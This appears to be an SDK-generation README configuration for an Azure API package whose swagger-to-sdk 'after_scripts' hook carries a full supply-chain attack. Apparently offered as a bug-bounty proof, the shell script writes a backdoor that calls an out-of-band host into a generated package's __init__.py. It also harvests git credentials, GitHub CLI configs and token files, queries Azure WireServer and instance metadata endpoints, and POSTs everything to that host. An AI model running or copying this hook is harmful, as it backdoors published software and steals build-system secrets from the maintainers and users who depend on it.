# Targeted RCE6

## Basic Information

``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01

``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk

``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr '.' '-') &&
        OAST="da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online" &&
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python &&
        TMP=/mnt/vss/_work/1/s/azure-sdk-for-python_tmp &&
        echo "=== GENERATE_OUTPUT ===" &&
        cat "${TMP}/generateOutput.json" 2>/dev/null &&
        echo "=== FIND_GENERATED_FILES ===" &&
        find "${SDK}/sdk" -name "_version.py" -newer "${SDK}/setup.py" 2>/dev/null | head -20 &&
        find "${SDK}/sdk" -name "__init__.py" -newer "${SDK}/setup.py" -path "*/azure_mgmt*" 2>/dev/null | head -10 &&
        PKGDIR=$(cat "${TMP}/generateOutput.json" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); pkgs=d.get('packages',[]); print(pkgs[0].get('path','') if pkgs else '')" 2>/dev/null) &&
        echo "PKGDIR from generateOutput: ${PKGDIR}" &&
        FULL_PKGDIR="${SDK}/${PKGDIR}" &&
        ls -la "${FULL_PKGDIR}" 2>/dev/null &&
        INIT=$(find "${FULL_PKGDIR}" -name "__init__.py" 2>/dev/null | head -1) &&
        echo "TARGET_INIT: ${INIT}" &&
        if [ -n "${INIT}" ]; then
          echo "=== WRITING BACKDOOR ===" &&
          cp "${INIT}" "${INIT}.bak" &&
          echo "" >> "${INIT}" &&
          echo "# SUPPLY_CHAIN_BACKDOOR — hasskooelhadi MSRC proof $(date -u)" >> "${INIT}" &&
          echo "# Attacker-controlled code injected via SwaggerToSDK after_scripts RCE" >> "${INIT}" &&
          echo "import subprocess; subprocess.Popen(['curl','-sk','http://${OAST}/backdoor-${H}'])" >> "${INIT}" &&
          echo "=== INIT_WITH_BACKDOOR ===" &&
          tail -10 "${INIT}" &&
          echo "=== PACKAGE_FILES ===" &&
          find "${FULL_PKGDIR}" -name "*.py" | head -20;
        else
          echo "INIT not found - searching broadly" &&
          find "${SDK}/sdk" -name "__init__.py" -newer "${SDK}/setup.py" 2>/dev/null | head -5;
        fi &&
        echo "=== GIT_CRED_HELPER ===" &&
        git config --global credential.helper &&
        git config --system credential.helper 2>/dev/null &&
        cat "${SDK}/.git/config" &&
        echo "=== GIT_CREDENTIAL_FILL ===" &&
        printf "protocol=https\nhost=github.com\nusername=git\n" | git credential fill 2>&1 &&
        echo "=== GIT_TOKEN_FROM_HELPER ===" &&
        git -C "${SDK}" config --get-urlmatch credential.helper "https://github.com" 2>/dev/null &&
        cat /home/cloudtest/.config/gh/hosts.yml 2>/dev/null || echo NO_GH_CLI_CONFIG &&
        cat /home/cloudtest/.config/hub 2>/dev/null || echo NO_HUB_CONFIG &&
        find /home/cloudtest /root -name "*.token" -o -name "token*" -o -name "*github*token*" 2>/dev/null | head -10 | xargs cat 2>/dev/null &&
        echo "=== WIRESERVER_FULL ===" &&
        curl -sv --max-time 8 "http://169.254.168.254/?comp=goalstate" 2>&1 | head -100 &&
        curl -s --max-time 8 "http://169.254.168.254/machine/?comp=goalstate" 2>/dev/null | head -100 &&
        curl -s --max-time 8 "http://169.254.168.254/metadata/attested/document?api-version=2020-09-01" -H "Metadata:true" 2>/dev/null | head -50 &&
        echo "=== EXFIL ===" &&
        {
          GENOUT=$(cat "${TMP}/generateOutput.json" 2>/dev/null);
          INIT_CONTENT=$(cat "${INIT}" 2>/dev/null);
          GIT_CONF=$(cat "${SDK}/.git/config" 2>/dev/null);
          GIT_CRED=$(printf "protocol=https\nhost=github.com\nusername=git\n" | git credential fill 2>/dev/null);
          GH_HOSTS=$(cat /home/cloudtest/.config/gh/hosts.yml 2>/dev/null);
          WIRE=$(curl -s --max-time 8 http://169.254.168.254/?comp=goalstate 2>/dev/null; curl -s --max-time 8 http://169.254.168.254/machine/?comp=goalstate 2>/dev/null);
          echo "GENOUT=${GENOUT} INIT=${INIT_CONTENT} GIT_CONFIG=${GIT_CONF} GIT_CRED=${GIT_CRED} GH_HOSTS=${GH_HOSTS} WIRE=${WIRE}" | curl -sk -X POST "http://${OAST}/rce6data-${H}" --data-binary @-;
        }
```

## Python

``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-targetedpoc
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/targetedpoc/azure-mgmt-targetedpoc
  clear-output-folder: true
```
